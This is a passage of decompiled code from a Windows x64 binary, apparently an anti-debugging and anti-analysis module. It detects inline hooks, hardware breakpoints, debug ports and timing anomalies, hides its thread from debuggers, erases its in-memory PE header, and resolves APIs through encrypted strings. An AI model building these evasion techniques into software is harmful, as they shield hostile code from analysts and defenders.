// ==== FUN_140002650 @ 140002650 size 226

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

bool FUN_140002650(longlong param_1)

{
  undefined8 uVar1;
  bool bVar2;
  undefined1 auStack_48 [32];
  undefined8 local_28;
  undefined8 uStack_20;
  ulonglong local_18;
  
  local_18 = DAT_140010000 ^ (ulonglong)auStack_48;
  if (param_1 == 0) {
    return true;
  }
  local_28 = 0;
  uStack_20 = 0;
  uVar1 = FUN_140002620(param_1,(longlong)&local_28);
  if ((char)uVar1 == '\0') {
    return true;
  }
  if ((char)local_28 == -0x34) {
    return true;
  }
  if ((char)local_28 == -0x17) {
    return true;
  }
  if ((char)local_28 == -1) {
    if ((local_28._1_1_ - 0x25 & 0xf7) == 0) {
      return true;
    }
LAB_1400026d8:
    if (local_28._1_1_ == 0xe0) {
      return true;
    }
  }
  else if ((char)local_28 == -0x70) {
    if (local_28._1_1_ == 0x90) {
      bVar2 = local_28._2_1_ == -0x70;
      goto LAB_1400026fe;
    }
  }
  else if ((char)local_28 == 'H') {
    if (local_28._1_1_ == 0xb8) {
      return true;
    }
  }
  else {
    if ((char)local_28 == -1) goto LAB_1400026d8;
    if ((char)local_28 == 'h') {
      if (local_28._5_1_ == -0x3d) {
        return true;
      }
    }
    else if ((char)local_28 == -0x15) {
      if (local_28._1_1_ == 0xfe) {
        return true;
      }
      if (local_28._1_1_ < 0x20) {
        return true;
      }
    }
  }
  bVar2 = local_28._1_1_ == 0xe9;
LAB_1400026fe:
  if ((((bVar2) || (local_28._5_1_ == -0x17)) || (local_28._5_1_ == -0x34)) ||
     ((local_28._6_1_ == -0x17 || (local_28._7_1_ == -0x17)))) {
    return true;
  }
  return (char)local_28 == -0x18;
}


// ==== FUN_140002740 @ 140002740 size 180

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140002740(void)

{
  undefined8 uVar1;
  uint7 uVar2;
  undefined1 auStack_508 [32];
  undefined1 local_4e8 [48];
  undefined4 local_4b8;
  uint local_4a4;
  longlong local_4a0;
  longlong local_498;
  longlong local_490;
  longlong local_488;
  char local_478;
  ulonglong local_18;
  
  local_18 = DAT_140010000 ^ (ulonglong)auStack_508;
  memset(local_4e8,0,0x4d0);
  local_4b8 = 0x100010;
  uVar1 = FUN_140001ed0();
  uVar1 = FUN_140001dd0(uVar1,local_4e8);
  uVar2 = (uint7)((ulonglong)uVar1 >> 8);
  if (((int)uVar1 == 0) ||
     ((((local_4a0 == 0 && (local_498 == 0)) && (local_490 == 0)) &&
      (((local_488 == 0 && (local_478 == '\0')) && ((local_4a4 & 0x100) == 0)))))) {
    return (ulonglong)uVar2 << 8;
  }
  return CONCAT71(uVar2,1);
}


// ==== FUN_140002800 @ 140002800 size 434

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140002800(void)

{
  bool bVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  ulonglong uVar4;
  undefined1 auStack_538 [32];
  undefined4 local_518;
  undefined4 local_514;
  undefined4 local_510;
  undefined4 local_50c;
  undefined1 local_508;
  undefined2 local_507;
  undefined1 local_505;
  undefined4 local_504;
  undefined4 local_500;
  undefined4 local_4fc;
  undefined4 local_4f8;
  undefined1 local_4f4;
  undefined2 local_4f3;
  undefined1 local_4f1;
  undefined4 local_4f0;
  undefined1 local_4e8 [48];
  undefined4 local_4b8;
  uint local_4a4;
  longlong local_4a0;
  longlong local_498;
  longlong local_490;
  longlong local_488;
  ulonglong local_478;
  ulonglong local_18;
  
  local_18 = DAT_140010000 ^ (ulonglong)auStack_538;
  memset(local_4e8,0,0x4d0);
  local_4b8 = 0x100010;
  uVar2 = FUN_140001ed0();
  uVar3 = FUN_140001dd0(uVar2,local_4e8);
  if ((int)uVar3 != 0) {
    if ((((local_4a0 != 0) || (local_498 != 0)) || (local_490 != 0)) ||
       (bVar1 = false, local_488 != 0)) {
      bVar1 = true;
      local_488 = 0;
      local_490 = 0;
      local_498 = 0;
      local_4a0 = 0;
    }
    if ((char)local_478 != '\0') {
      bVar1 = true;
      local_478 = local_478 & 0xffffff00;
    }
    if ((local_4a4 >> 8 & 1) == 0) {
      if (!bVar1) {
        return;
      }
    }
    else {
      local_4a4 = local_4a4 & 0xfffffeff;
    }
    if (DAT_1400102f9 == '\0') {
      DAT_1400102f9 = '\x01';
      uVar4 = rdtsc();
      local_500 = 0x18df09a8;
      local_4fc = 0x9c69b8a7;
      DAT_140010358 = uVar4 ^ 0x10cacba0a;
      local_4f8 = 0x43578825;
      local_4f4 = 0xe1;
      local_4f3 = 0;
      local_4f1 = 0;
      local_507 = 0;
      local_505 = 0;
      local_4f0 = 0xe;
      local_518 = 0x166f59eb;
      local_514 = 0xfa79f32f;
      local_510 = 0xa6b5209;
      local_50c = 0xbfc451aa;
      local_508 = 0x38;
      local_504 = 0xf;
      uVar4 = FUN_140008580((longlong)&local_500,(longlong)&local_518);
      DAT_140010328 = uVar4 ^ DAT_140010358;
    }
    if ((code *)(DAT_140010328 ^ DAT_140010358) != (code *)0x0) {
      (*(code *)(DAT_140010328 ^ DAT_140010358))(uVar2,local_4e8);
    }
  }
  return;
}


// ==== FUN_1400029c0 @ 1400029c0 size 282

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined4 FUN_1400029c0(void)

{
  int iVar1;
  ulonglong uVar2;
  undefined1 auStack_78 [32];
  undefined4 local_58;
  undefined4 *local_50;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined1 local_34;
  undefined2 local_33;
  undefined1 local_31;
  undefined4 local_30;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18 [2];
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_78;
  local_28 = 0xd64b530b;
  local_24 = 0x8ef4c6dc;
  local_20 = 0xef85;
  local_1c = 0x20;
  local_48 = 0xcac49c5e;
  local_44 = 0x29c89ce5;
  local_40 = 0xdf91b81b;
  local_3c = 0x1b718d29;
  local_38 = 0x8824dfbf;
  local_34 = 0x7d;
  local_33 = 0;
  local_31 = 0;
  local_30 = 0x21;
  if (DAT_1400102e1 == '\0') {
    DAT_1400102e1 = '\x01';
    uVar2 = rdtsc();
    DAT_1400102f0 = uVar2 ^ 0x135c83ee3;
    uVar2 = FUN_140009c00((longlong)&local_28,(longlong)&local_48);
    DAT_1400101c8 = uVar2 ^ DAT_1400102f0;
  }
  if ((code *)(DAT_1400101c8 ^ DAT_1400102f0) == (code *)0x0) {
    return 0;
  }
  local_50 = local_18;
  local_18[0] = 0;
  local_58 = 0;
  iVar1 = (*(code *)(DAT_1400101c8 ^ DAT_1400102f0))(0x1d,0,0,0);
  return CONCAT31((int3)(iVar1 + 0x3ffffcadU >> 8),1 < iVar1 + 0x3ffffcadU);
}


// ==== FUN_140002ae0 @ 140002ae0 size 458

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

ulonglong FUN_140002ae0(void)

{
  ulonglong uVar1;
  undefined1 auStack_98 [32];
  int local_78;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined1 local_44;
  undefined2 local_43;
  undefined1 local_41;
  undefined4 local_40;
  ulonglong local_38;
  ulonglong local_30;
  ulonglong local_28;
  longlong local_20;
  ulonglong local_18;
  
  local_18 = DAT_140010000 ^ (ulonglong)auStack_98;
  local_28 = 0;
  local_30 = 0;
  local_20 = 0;
  if (DAT_1400103a0 == '\0') {
    DAT_1400103a0 = '\x01';
    uVar1 = rdtsc();
    local_50 = 0x8604a2f3;
    local_4c = 0x1daad9c8;
    DAT_140010290 =
         (CONCAT44((int)(local_18 >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^ 0x110fc1458;
    local_48 = 0xb08834b5;
    local_44 = 0x15;
    local_43 = 0;
    local_41 = 0;
    local_40 = 8;
    local_70 = 0x4782ef6a;
    local_6c = 0xf306edb9;
    local_68 = 0x9a0670b8;
    local_64 = 0x9438a87e;
    local_60 = 0x8dabc4f;
    local_5c = 0x1e2d341e;
    local_58 = 0x2f3f;
    local_54 = 9;
    uVar1 = FUN_140007e00((longlong)&local_50,(longlong)&local_70);
    DAT_140010388 = uVar1 ^ DAT_140010290;
  }
  uVar1 = 0;
  if ((((code *)(DAT_140010388 ^ DAT_140010290) != (code *)0x0) &&
      (uVar1 = (*(code *)(DAT_140010388 ^ DAT_140010290))(&local_28), (int)uVar1 != 0)) &&
     (uVar1 = FUN_140001ce0(&local_30), (int)uVar1 != 0)) {
    local_38 = local_30;
    local_78 = 0;
    do {
      local_38 = local_38 ^ (longlong)local_78 * -0x61c8864680b583eb;
      local_38 = (local_38 << 0xd | local_38 >> 0x33) ^ 0xdeadbeef;
      local_78 = local_78 + 1;
    } while (local_78 < 500);
    uVar1 = FUN_140001ce0(&local_20);
    if (((int)uVar1 != 0) && (local_28 != 0)) {
      local_28 = ((local_20 - local_30) * 1000000) / local_28;
      return CONCAT71((int7)(local_28 >> 8),0x14 < local_28);
    }
  }
  return uVar1 & 0xffffffffffffff00;
}


// ==== FUN_140002cb0 @ 140002cb0 size 46

ulonglong FUN_140002cb0(void)

{
  ulonglong uVar1;
  undefined8 in_RAX;
  ulonglong uVar2;
  
  uVar1 = DAT_140010258;
  uVar2 = rdtsc();
  uVar2 = CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar2) | uVar2 & 0xffffffff00000000;
  if ((DAT_140010258 == 0) || (DAT_140010258 <= uVar2 + 1000000)) {
    LOCK();
    DAT_140010258 = uVar2;
    UNLOCK();
    return uVar1 & 0xffffffffffffff00;
  }
  return CONCAT71((int7)(uVar2 >> 8),1);
}


// ==== FUN_140002ce0 @ 140002ce0 size 1571

uint FUN_140002ce0(void)

{
  longlong lVar1;
  bool bVar2;
  longlong *plVar3;
  int *piVar4;
  uint uVar5;
  undefined4 local_2f8;
  undefined4 local_2f4;
  undefined4 local_2f0;
  undefined1 local_2ec;
  undefined2 local_2eb;
  undefined1 local_2e9;
  undefined4 local_2e8;
  undefined4 local_2e0;
  undefined4 local_2dc;
  undefined4 local_2d8;
  undefined4 local_2d4;
  undefined4 local_2d0;
  undefined4 local_2cc;
  undefined4 local_2c8;
  undefined4 local_2c4;
  undefined4 local_2c0;
  undefined4 local_2bc;
  undefined4 local_2b8;
  undefined4 local_2b4;
  undefined4 local_2b0;
  undefined4 local_2a8;
  undefined4 local_2a4;
  undefined4 local_2a0;
  undefined4 local_29c;
  undefined4 local_298;
  undefined4 local_294;
  undefined4 local_290;
  undefined4 local_288;
  undefined4 local_284;
  undefined4 local_280;
  undefined4 local_27c;
  undefined4 local_278;
  undefined4 local_274;
  undefined4 local_270;
  undefined4 local_26c;
  undefined4 local_268;
  undefined4 local_264;
  undefined4 local_260;
  undefined4 local_25c;
  undefined4 local_258;
  undefined4 local_254;
  undefined1 local_250;
  undefined2 local_24f;
  undefined1 local_24d;
  undefined4 local_24c;
  undefined4 local_248;
  undefined4 local_244;
  undefined4 local_240;
  undefined4 local_23c;
  undefined4 local_238;
  undefined4 local_234;
  undefined1 local_230;
  undefined2 local_22f;
  undefined1 local_22d;
  undefined4 local_22c;
  undefined4 local_228;
  undefined4 local_224;
  undefined4 local_220;
  undefined4 local_21c;
  undefined4 local_218;
  undefined4 local_210;
  undefined4 local_20c;
  undefined4 local_208;
  undefined4 local_204;
  undefined4 local_200;
  undefined4 local_1fc;
  undefined4 local_1f8;
  undefined4 local_1f4;
  undefined4 local_1f0;
  undefined4 local_1ec;
  undefined4 local_1e8;
  undefined4 local_1e4;
  undefined4 local_1e0;
  undefined4 local_1dc;
  undefined4 local_1d8;
  undefined4 local_1d4;
  undefined4 local_1d0;
  undefined4 local_1cc;
  undefined4 local_1c8;
  undefined4 local_1c4;
  undefined4 local_1c0;
  undefined4 local_1bc;
  undefined4 local_1b8;
  undefined4 local_1b4;
  undefined1 local_1b0;
  undefined2 local_1af;
  undefined1 local_1ad;
  undefined4 local_1ac;
  undefined4 local_1a8;
  undefined4 local_1a4;
  undefined4 local_1a0;
  undefined4 local_19c;
  undefined1 local_198;
  undefined2 local_197;
  undefined1 local_195;
  undefined4 local_194;
  undefined4 local_190;
  undefined4 local_18c;
  undefined4 local_188;
  undefined4 local_184;
  undefined4 local_180;
  undefined4 local_178;
  undefined4 local_174;
  undefined4 local_170;
  undefined1 local_16c;
  undefined2 local_16b;
  undefined1 local_169;
  undefined4 local_168;
  undefined4 local_160;
  undefined4 local_15c;
  undefined4 local_158;
  undefined1 local_154;
  undefined2 local_153;
  undefined1 local_151;
  undefined4 local_150;
  undefined4 local_148;
  undefined4 local_144;
  undefined1 local_140;
  undefined2 local_13f;
  undefined1 local_13d;
  undefined4 local_13c;
  longlong local_138;
  uint local_130 [2];
  longlong local_128;
  undefined4 local_120;
  longlong local_118;
  undefined4 local_110;
  longlong local_108;
  undefined4 local_100;
  longlong local_f8;
  undefined4 local_f0;
  longlong local_e8;
  undefined4 local_e0;
  longlong local_d8;
  undefined4 local_d0;
  longlong local_c8;
  undefined4 local_c0;
  longlong local_b8;
  undefined4 local_b0;
  longlong local_a8;
  undefined4 local_a0;
  longlong local_98;
  undefined4 local_90;
  longlong local_88;
  undefined4 local_80;
  longlong local_78;
  undefined4 local_70;
  longlong local_68;
  undefined4 local_60;
  longlong local_58;
  undefined4 local_50;
  longlong local_48;
  undefined4 local_40;
  longlong local_38;
  undefined4 local_30;
  longlong local_28;
  
  uVar5 = 0;
  local_2e0 = 0x54d7da75;
  local_2dc = 0x440c2a36;
  local_2eb = 0;
  local_2e9 = 0;
  local_24f = 0;
  local_24d = 0;
  local_13f = 0;
  local_13d = 0;
  local_16b = 0;
  local_169 = 0;
  local_2d8 = 0x8069;
  local_2d4 = 0x22;
  local_2f8 = 0x9dd65708;
  local_2f4 = 0xeac754b2;
  local_2f0 = 0xa9a9822e;
  local_2ec = 0x85;
  local_2e8 = 0x23;
  local_210 = 0x1f60973c;
  local_20c = 0x6ed8bbab;
  local_208 = 0xee1b05a6;
  local_204 = 0x24;
  local_200 = 0x66910e5;
  local_1fc = 0xfb5f726e;
  local_1f8 = 0xe5c378;
  local_1f4 = 0x25;
  local_288 = 0x34381caf;
  local_284 = 0x13c122ed;
  local_280 = 0xf2704728;
  local_27c = 0x660709a7;
  local_278 = 0xe3ac4458;
  local_274 = 0x9bd822a1;
  local_270 = 0xca81;
  local_26c = 0x26;
  local_268 = 0x998b5c99;
  local_264 = 0x440fa8b;
  local_260 = 0xf60d321e;
  local_25c = 0x6900b4b;
  local_258 = 0xaf7c9829;
  local_254 = 0x737dc752;
  local_250 = 0x36;
  local_24c = 0x27;
  local_2a8 = 0x4cf72e40;
  local_2a4 = 0x5391a33e;
  local_2a0 = 0xaade5a2a;
  local_29c = 0x8ce0c682;
  local_298 = 0xc59b9a07;
  local_294 = 0x698308;
  local_290 = 0x28;
  local_2d0 = 0x21f47e73;
  local_2cc = 0xad5bd4bb;
  local_2c8 = 0xfa162c87;
  local_2c4 = 0x4bd94c1c;
  local_2c0 = 0x1caa614a;
  local_2bc = 0xde54395;
  local_2b8 = 0x97c05355;
  local_2b4 = 0x58632f;
  local_2b0 = 0x29;
  local_1f0 = 0x33fe4f9c;
  local_1ec = 0xda6402a;
  local_1e8 = 0x55066a;
  local_1e4 = 0x2a;
  local_190 = 0x48567b8b;
  local_18c = 0xb4b05b;
  local_188 = 0xd588d187;
  local_184 = 0xb819;
  local_180 = 0x2b;
  local_148 = 0x85de300f;
  local_144 = 0x3d39b723;
  local_140 = 0x3e;
  local_13c = 0x2c;
  local_178 = 0xcc26eebe;
  local_174 = 0xab7ed77c;
  local_170 = 0xcf7a1d53;
  local_16c = 0x32;
  local_168 = 0x2d;
  local_228 = 0xf97a5f5c;
  local_224 = 0xa7fe8e16;
  local_220 = 0x489d43f1;
  local_21c = 0xd7fcdc;
  local_218 = 0x2e;
  local_1e0 = 0x7369e66;
  local_1dc = 0xf16fa057;
  local_1d8 = 0x135e3f30;
  local_1d4 = 0x2f;
  local_160 = 0xd7b8e49f;
  local_15c = 0x55c139eb;
  local_158 = 0x31e5523c;
  local_154 = 0x96;
  local_153 = 0;
  local_151 = 0;
  local_150 = 0x30;
  local_1d0 = 0x7885abfe;
  local_1cc = 0xc47d2939;
  local_1c8 = 0x3146ce34;
  local_1c4 = 0x31;
  local_248 = 0xbde8864;
  local_244 = 0xb2db281c;
  local_240 = 0x9c3440a5;
  local_23c = 0xf98a7fb0;
  local_238 = 0xa1ef1033;
  local_234 = 0xab1c25af;
  local_230 = 0x40;
  local_22f = 0;
  local_22d = 0;
  local_22c = 0x32;
  local_1c0 = 0x53d44c3e;
  local_1bc = 0xe4849be4;
  local_1b8 = 0xbd38e700;
  local_1b4 = 0xa6bdd06f;
  local_1b0 = 0x47;
  local_1af = 0;
  local_1ad = 0;
  local_1ac = 0x33;
  local_1a8 = 0xc5aeae30;
  local_1a4 = 0xb9026e0a;
  local_1a0 = 0x3ecf1e6f;
  local_19c = 0x6f080f83;
  local_198 = 0x8b;
  local_197 = 0;
  local_195 = 0;
  local_194 = 0x34;
  local_138 = FUN_1400090c0((longlong)&local_2e0,(longlong)&local_210);
  local_130[0] = 1;
  local_128 = FUN_140009fc0((longlong)&local_2e0,(longlong)&local_200);
  local_120 = 2;
  local_118 = FUN_140009840((longlong)&local_2e0,(longlong)&local_288);
  local_110 = 4;
  local_108 = FUN_14000a380((longlong)&local_2e0,(longlong)&local_268);
  local_100 = 8;
  local_f8 = FUN_14000a740((longlong)&local_2e0,(longlong)&local_2a8);
  local_f0 = 0x10;
  local_e8 = FUN_140007a40((longlong)&local_2e0,(longlong)&local_2d0);
  local_e0 = 0x20;
  local_d8 = FUN_140009fc0((longlong)&local_2e0,(longlong)&local_1f0);
  local_d0 = 0x40;
  local_c8 = FUN_140009480((longlong)&local_2f8,(longlong)&local_190);
  local_c0 = 0x100;
  local_b8 = FUN_14000ab00((longlong)&local_2f8,(longlong)&local_148);
  local_b0 = 0x200;
  local_a8 = FUN_140006f00((longlong)&local_2f8,(longlong)&local_178);
  local_a0 = 0x400;
  local_98 = FUN_1400072c0((longlong)&local_2f8,(longlong)&local_228);
  local_90 = 0x800;
  local_88 = FUN_140007680((longlong)&local_2f8,(longlong)&local_1e0);
  local_80 = 0x1000;
  local_78 = FUN_140006f00((longlong)&local_2f8,(longlong)&local_160);
  local_70 = 0x2000;
  local_68 = FUN_140007680((longlong)&local_2f8,(longlong)&local_1d0);
  local_60 = 0x4000;
  local_58 = FUN_14000aec0((longlong)&local_2f8,(longlong)&local_248);
  local_50 = 0x8000;
  local_48 = FUN_140008580((longlong)&local_2f8,(longlong)&local_1c0);
  local_40 = 0x40000;
  local_38 = FUN_140008580((longlong)&local_2f8,(longlong)&local_1a8);
  plVar3 = &local_138;
  local_30 = 0x80000;
  do {
    bVar2 = FUN_140002650(*plVar3);
    lVar1 = DAT_140010248;
    if (bVar2) {
      uVar5 = uVar5 | *(uint *)(plVar3 + 1);
    }
    plVar3 = plVar3 + 2;
  } while (plVar3 != &local_28);
  if (DAT_140010248 != 0) {
    piVar4 = &DAT_14000e420;
    do {
      bVar2 = FUN_140002650(*(longlong *)(lVar1 + (longlong)*piVar4 * 8));
      if (bVar2) {
        uVar5 = uVar5 | piVar4[1];
      }
      piVar4 = piVar4 + 2;
    } while (piVar4 != (int *)&DAT_14000e468);
  }
  return uVar5;
}


// ==== FUN_140003310 @ 140003310 size 95

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_140003310(undefined8 param_1)

{
  undefined8 uVar1;
  uint7 uVar2;
  undefined1 auStack_48 [48];
  longlong local_18;
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_48;
  local_18 = 0;
  uVar1 = FUN_140002500(param_1,7,&local_18);
  uVar2 = (uint7)((ulonglong)uVar1 >> 8);
  if (((int)uVar1 == 0) && (local_18 != 0)) {
    return CONCAT71(uVar2,1);
  }
  return (ulonglong)uVar2 << 8;
}


// ==== FUN_140003370 @ 140003370 size 95

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_140003370(undefined8 param_1)

{
  undefined8 uVar1;
  uint7 uVar2;
  undefined1 auStack_48 [48];
  longlong local_18;
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_48;
  local_18 = 0;
  uVar1 = FUN_140002500(param_1,0x1e,&local_18);
  uVar2 = (uint7)((ulonglong)uVar1 >> 8);
  if (((int)uVar1 == 0) && (local_18 != 0)) {
    return CONCAT71(uVar2,1);
  }
  return (ulonglong)uVar2 << 8;
}


// ==== FUN_1400033d0 @ 1400033d0 size 217

void FUN_1400033d0(void)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  
  local_38 = 0xfc5634a8;
  local_34 = 0x28876bc9;
  local_30 = 0xdaac;
  local_2c = 0x35;
  local_28 = 0x56974aba;
  local_24 = 0x663fa4fa;
  local_20 = 0x285bcd11;
  local_1c = 0x1ccaa1d8;
  local_18 = 0x3eba55ff;
  local_14 = 0xecc99;
  local_10 = 0x36;
  if (DAT_140010380 == '\0') {
    DAT_140010380 = '\x01';
    uVar1 = rdtsc();
    DAT_140010360 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x154a53890;
    uVar1 = FUN_14000a740((longlong)&local_38,(longlong)&local_28);
    DAT_1400103a8 = uVar1 ^ DAT_140010360;
  }
  if ((code *)(DAT_1400103a8 ^ DAT_140010360) == (code *)0x0) {
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x0001400034a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(DAT_1400103a8 ^ DAT_140010360))(0xfffffffffffffffe,0x11,0,0);
  return;
}


// ==== FUN_1400034b0 @ 1400034b0 size 87

undefined8 FUN_1400034b0(void)

{
  longlong lVar1;
  undefined8 in_RAX;
  ulonglong uVar2;
  int local_res8;
  
  uVar2 = rdtsc();
  local_res8 = 0;
  do {
    local_res8 = local_res8 + 1;
  } while (local_res8 < 5);
  lVar1 = rdtsc();
  uVar2 = lVar1 - (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar2) |
                  uVar2 & 0xffffffff00000000);
  return CONCAT71((int7)(uVar2 >> 8),500000 < uVar2);
}


// ==== FUN_140003510 @ 140003510 size 157

uint FUN_140003510(undefined8 param_1)

{
  uint uVar1;
  undefined4 uVar2;
  undefined8 uVar3;
  ulonglong uVar4;
  uint uVar5;
  
  uVar1 = FUN_140002ce0();
  uVar3 = FUN_140003310(param_1);
  uVar5 = uVar1 | 0x10000000;
  if ((char)uVar3 == '\0') {
    uVar5 = uVar1;
  }
  uVar3 = FUN_140003370(param_1);
  uVar1 = uVar5 | 0x20000000;
  if ((char)uVar3 == '\0') {
    uVar1 = uVar5;
  }
  uVar3 = FUN_1400034b0();
  uVar5 = uVar1 | 0x40000000;
  if ((char)uVar3 == '\0') {
    uVar5 = uVar1;
  }
  uVar3 = FUN_140002740();
  uVar1 = uVar5 | 0x4000000;
  if ((char)uVar3 == '\0') {
    uVar1 = uVar5;
  }
  uVar2 = FUN_1400029c0();
  uVar5 = uVar1 | 0x2000000;
  if ((char)uVar2 == '\0') {
    uVar5 = uVar1;
  }
  uVar4 = FUN_140002ae0();
  uVar1 = uVar5 | 0x1000000;
  if ((char)uVar4 == '\0') {
    uVar1 = uVar5;
  }
  uVar4 = FUN_140002cb0();
  uVar5 = uVar1 | 0x800000;
  if ((char)uVar4 == '\0') {
    uVar5 = uVar1;
  }
  FUN_140002800();
  return uVar5;
}


// ==== FUN_1400035b0 @ 1400035b0 size 244

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_1400035b0(void)

{
  int iVar1;
  uint uVar2;
  short *psVar3;
  undefined8 uVar4;
  uint uVar5;
  ulonglong uVar6;
  undefined1 auStack_38 [32];
  undefined4 local_18 [2];
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_38;
  if (DAT_1400102d1 == '\0') {
    DAT_1400102d1 = '\x01';
    psVar3 = *(short **)((longlong)ProcessEnvironmentBlock + 0x10);
    if ((((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
        (iVar1 = *(int *)(psVar3 + 0x1e), iVar1 - 1U < 0x1000)) &&
       (*(int *)((longlong)iVar1 + (longlong)psVar3) == 0x4550)) {
      uVar2 = *(uint *)((longlong)iVar1 + 0x54 + (longlong)psVar3);
      if (uVar2 - 1 < 0x10000) {
        local_18[0] = 0;
        uVar4 = FUN_140001af0(psVar3,(ulonglong)uVar2,4,local_18);
        if ((int)uVar4 != 0) {
          uVar6 = 0;
          if (uVar2 != 0) {
            do {
              *(undefined1 *)(uVar6 + (longlong)psVar3) = 0;
              uVar5 = (int)uVar6 + 1;
              uVar6 = (ulonglong)uVar5;
            } while (uVar5 < uVar2);
          }
          FUN_140001af0(psVar3,(ulonglong)uVar2,2,local_18);
        }
      }
    }
  }
  return;
}


// ==== FUN_1400036b0 @ 1400036b0 size 36

ulonglong FUN_1400036b0(uint param_1)

{
  longlong lVar1;
  
  lVar1 = (ulonglong)param_1 * (ulonglong)param_1 + (ulonglong)param_1;
  return CONCAT71((int7)((ulonglong)lVar1 >> 8),~(byte)lVar1) & 0xffffffffffffff01;
}


// ==== FUN_1400036e0 @ 1400036e0 size 24

undefined8 FUN_1400036e0(uint param_1)

{
  ulonglong uVar1;
  
  uVar1 = (ulonglong)param_1 * (ulonglong)param_1 & 0xffffffffffffff03;
  return CONCAT71((int7)(uVar1 >> 8),1 < (byte)uVar1);
}


// ==== FUN_140003700 @ 140003700 size 7

bool FUN_140003700(int param_1)

{
  return param_1 == -1;
}


// ==== FUN_140003710 @ 140003710 size 83

int FUN_140003710(uint param_1)

{
  uint uVar1;
  uint *puVar2;
  
  puVar2 = FUN_1400015f0();
  uVar1 = *puVar2;
  puVar2 = FUN_1400015f0();
  uVar1 = (param_1 ^ uVar1) * puVar2[4];
  puVar2 = FUN_1400015f0();
  return (uVar1 ^ uVar1 >> 0x10) + puVar2[2];
}


// ==== FUN_140003770 @ 140003770 size 91

uint FUN_140003770(uint param_1)

{
  uint *puVar1;
  uint local_res8;
  int local_res10;
  
  local_res10 = 0;
  local_res8 = param_1;
  do {
    puVar1 = FUN_1400015f0();
    local_res8 = (local_res8 ^ local_res8 << 0xd) * puVar1[5];
    local_res8 = local_res8 ^ local_res8 >> 0x11;
    local_res10 = local_res10 + 1;
  } while (local_res10 < 4);
  return local_res8;
}


// ==== FUN_1400037d0 @ 1400037d0 size 60

void FUN_1400037d0(longlong *param_1)

{
  if (*param_1 == 0) {
    *(undefined4 *)(param_1 + 1) = 0;
    return;
  }
  FUN_1400022c0(*param_1,0xffff);
  FUN_140001bf0(*param_1);
  *param_1 = 0;
  *(undefined4 *)(param_1 + 1) = 0;
  return;
}


// ==== FUN_140003810 @ 140003810 size 248

undefined8 * FUN_140003810(undefined8 *param_1)

{
  longlong lVar1;
  undefined8 *_Dst;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  *(undefined2 *)(param_1 + 9) = 1;
  *(undefined8 *)((longlong)param_1 + 0x4c) = 0;
  memset(param_1 + 0xb,0,0x200);
  _Dst = param_1 + 0x54;
  param_1[0x4b] = 0;
  param_1[0x4c] = 0;
  param_1[0x4d] = 0;
  param_1[0x4e] = 0;
  param_1[0x4f] = 0;
  param_1[0x50] = 0;
  param_1[0x51] = 0;
  *(undefined4 *)(param_1 + 0x52) = 0;
  param_1[0x53] = 0;
  memset(_Dst,0,0x200);
  param_1[0x94] = 0;
  *(undefined2 *)(param_1 + 0x95) = 0;
  *(undefined8 *)((longlong)param_1 + 0x4ac) = 0;
  *(undefined8 *)((longlong)param_1 + 0x4b4) = 0;
  *(undefined4 *)((longlong)param_1 + 0x4bc) = 0;
  param_1[0x98] = 0;
  param_1[0x99] = 0;
  if (param_1[0x4c] == 0) {
    lVar1 = FUN_140001a00(_Dst,0x10000);
    param_1[0x4c] = lVar1;
    if (lVar1 != 0) {
      FUN_1400022c0(lVar1,0x10000);
    }
  }
  return param_1;
}


// ==== FUN_140003910 @ 140003910 size 178

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140003910(longlong param_1)

{
  ulonglong uVar1;
  undefined1 auStack_38 [32];
  undefined1 local_18 [8];
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_38;
  if (*(longlong *)(param_1 + 0x278) != 0) {
    uVar1 = 0;
    if (*(longlong *)(param_1 + 0x270) != 0) {
      uVar1 = *(longlong *)(param_1 + 0x270) + 0xfffU & 0xfffffffffffff000;
    }
    FUN_140001af0(*(longlong *)(param_1 + 0x278),uVar1 + 0x2000,4,local_18);
    if ((*(longlong *)(param_1 + 0x268) != 0) && (*(ulonglong *)(param_1 + 0x270) != 0)) {
      FUN_1400022c0(*(longlong *)(param_1 + 0x268),*(ulonglong *)(param_1 + 0x270));
    }
